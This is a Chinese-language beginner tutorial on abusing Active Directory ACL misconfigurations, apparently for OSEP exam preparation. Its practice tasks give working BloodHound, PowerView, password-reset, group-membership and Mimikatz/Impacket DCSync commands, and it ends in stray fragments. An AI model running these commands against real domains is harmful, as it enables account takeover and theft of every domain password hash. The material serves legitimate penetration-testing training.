# AD权限滥用 - 新手章节指南

## 这个目录是干什么的？

Active Directory (AD) 是 Windows 域环境的核心。AD 中的权限配置错误可以被利用来提升权限、获取敏感信息。这个目录教你如何发现和利用这些配置错误。

---

## 为什么要学这个？

```
AD 权限滥用的价值：
├── 不需要漏洞利用
├── 利用的是配置错误
├── 可以从普通用户提升到域管理员
├── 是域渗透的核心技术
└── OSEP 考试必考内容

现实场景：
├── 你获得了一个普通域用户
├── 枚举发现该用户对某个组有写权限
├── 把自己加入该组
├── 该组对域管理员有某些权限
└── 最终获得域管理员权限
```

## 通俗理解核心概念

### 什么是 ACL？

```
ACL = Access Control List = 访问控制列表

类比：
├── AD 中的每个对象都有一个"权限清单"
├── 清单上写着谁可以做什么
├── 比如：用户 A 可以修改用户 B 的密码
└── 这就是 ACL

ACL 中的权限类型：
├── GenericAll - 完全控制
├── GenericWrite - 写入属性
├── WriteOwner - 修改所有者
├── WriteDACL - 修改权限
├── ForceChangePassword - 强制改密码
└── 还有很多...
```

### 常见的权限滥用路径

```
1. GenericAll 权限
├── 对用户：可以重置密码
├── 对组：可以添加成员
├── 对计算机：可以配置委派
└── 最强大的权限

2. WriteDACL 权限
├── 可以修改对象的 ACL
├── 给自己添加更多权限
├── 比如添加 GenericAll
└── 间接获得完全控制

3. WriteOwner 权限
├── 可以修改对象的所有者
├── 所有者可以修改 ACL
├── 然后给自己添加权限
└── 也是间接获得控制

4. ForceChangePassword 权限
├── 可以重置用户密码
├── 不需要知道原密码
├── 直接接管账户
└── 对用户对象有效
```

### DCSync 攻击

```
什么是 DCSync？
├── 模拟域控制器
├── 请求复制域数据
├── 获取所有用户的密码哈希
└── 包括 krbtgt 账户

需要的权限：
├── Replicating Directory Changes
├── Replicating Directory Changes All
└── 通常只有域管理员有这些权限

攻击价值：
├── 获得所有用户的哈希
├── 可以进行 Pass-the-Hash
├── 可以制作金票
└── 完全控制域
```

## 实践任务清单

### 任务1：使用 BloodHound 枚举

```powershell
# 收集数据
# 下载 SharpHound
.\SharpHound.exe -c All

# 或使用 PowerShell 版本
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# 将生成的 zip 文件导入 BloodHound
# 分析攻击路径
```

### 任务2：使用 PowerView 枚举 ACL

```powershell
# 导入 PowerView
Import-Module .\PowerView.ps1

# 查找对当前用户有特殊权限的对象
Find-InterestingDomainAcl -ResolveGUIDs

# 查找对特定用户有权限的对象
Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs

# 查找有 GenericAll 权限的对象
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### 任务3：利用 GenericAll 权限

```powershell
# 如果对用户有 GenericAll，可以重置密码
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)

# 如果对组有 GenericAll，可以添加成员
Add-DomainGroupMember -Identity "Target Group" -Members "attacker_user"

# 如果对计算机有 GenericAll，可以配置委派
# 这需要更复杂的操作
```

### 任务4：DCSync 攻击

```powershell
# 使用 Mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator

# 使用 Impacket
python secretsdump.py corp.local/admin:password@dc_ip

# 获取 krbtgt 哈希后可以制作金票
```

```

│   └── 找到有 DCSync 权限的用户

│   └── 找到配置了无约束委派的计算机

    └── 列出所有域管理员
```
